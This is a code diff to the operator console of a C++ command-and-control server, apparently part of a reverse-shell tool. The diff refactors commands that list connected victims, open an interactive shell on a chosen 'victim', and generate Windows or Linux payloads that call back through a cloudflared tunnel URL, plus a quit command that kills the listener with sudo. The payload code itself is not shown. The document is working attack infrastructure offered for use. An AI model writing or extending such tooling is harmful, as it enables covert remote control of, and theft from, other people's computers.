@@ -12,11 +12,12 @@
 #include <unordered_set>
 #include <vector>
 #include <sstream>
-#include "command.cpp"
-#include "PayloadGenerator.cpp"
 #include <regex>
+#include <ifaddrs.h>
 #include <cctype>
 #include<random>
+#include "command.cpp"
+#include "PayloadGenerator.cpp"
 
 using namespace std;
 
@@ -67,58 +68,62 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
     cout << "    Type 'help' to see available commands.\n\n";
 
     while (true) {
-        string id;
+        string shell_command;
         cout << "[MainShell] > ";
-        getline(cin >> ws, id);
+        getline(cin >> ws, shell_command);
 
-        vector<string> tokens;
-        stringstream ss(id);
+        // Parse tokens into vector to keep order
+        stringstream ss(shell_command);
         string token;
-
-        while (getline(ss, token, ' ')) {
+        vector<string> tokens;
+        while (ss >> token) {
             tokens.push_back(token);
         }
 
-        unordered_set<string> se(tokens.begin(), tokens.end());
-        if (id == "help") {
+        if (shell_command == "help") {
             help();
             cout << endl;
-        } else if (id == "banner") {
+        } else if (shell_command == "banner") {
             banner();
             cout << endl;
-        } else if (se.find("show") != se.end()) {
+        } else if (shell_command == "show shell") {
             show_shell(mp);
             cout << endl;
-        } else if (se.find("shell") != se.end()) {
-            if (mp.find(tokens[tokens.size() - 1]) != mp.end()) {
-                serve_client(tokens[tokens.size() - 1], server_fd);
+        } 
+        // Command: shell <victim_name>
+        else if (tokens.size() == 2 && tokens[0] == "shell") {
+            string victim_name = tokens[1];
+            if (mp.find(victim_name) != mp.end()) {
+                serve_client(victim_name, server_fd);
             } else {
-                cout << "\n[-] Client ID not found.\n\n";
+                cout << "\n[-] Victim ID not found.\n\n";
             }
-        } 
-        else if (se.find("generate")!=se.end()){
-            if(se.find("os=windows")!=se.end()){
-                string payload=payload_generator_windows(cloudflared_url);
-                cout<<"\n"<<payload<<"\n"<<endl;
+        }
+        // Command: generate os=windows or generate os=linux
+        else if (tokens.size() == 2 && tokens[0] == "generate") {
+            string os_token = tokens[1];
+            if (os_token == "os=windows") {
+                string payload = payload_generator_windows(cloudflared_url);
+                cout << "\n" << payload << "\n" << endl;
             }
-            else if(se.find("os=linux")!=se.end()){
-                string payload=payload_generator_linux(cloudflared_url);
-                cout<<"\n"<<payload<<"\n"<<endl;            }
-            else{
-                cout<<"Os does not found."<<endl;
+            else if (os_token == "os=linux") {
+                string payload = payload_generator_linux(cloudflared_url);
+                cout << "\n" << payload << "\n" << endl;
             }
-        } 
-
-        else if(se.find("quit")!=se.end() and !se.empty()){
-            string command="sudo kill $(sudo lsof -ti :"+to_string(PORT)+") 2>&1 &";
+            else {
+                cout << "OS not found or not supported.\n";
+            }
+        }
+        else if (shell_command == "quit") {
+            string command = "sudo kill $(sudo lsof -ti :" + to_string(PORT) + ") 2>&1 &";
             system(command.c_str());
+            cout << "\nServer closed..." << endl;
             break;
         }
         else {
             cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
         }
     }
-    return;
 }
 
 string url_decode(const string& request) {
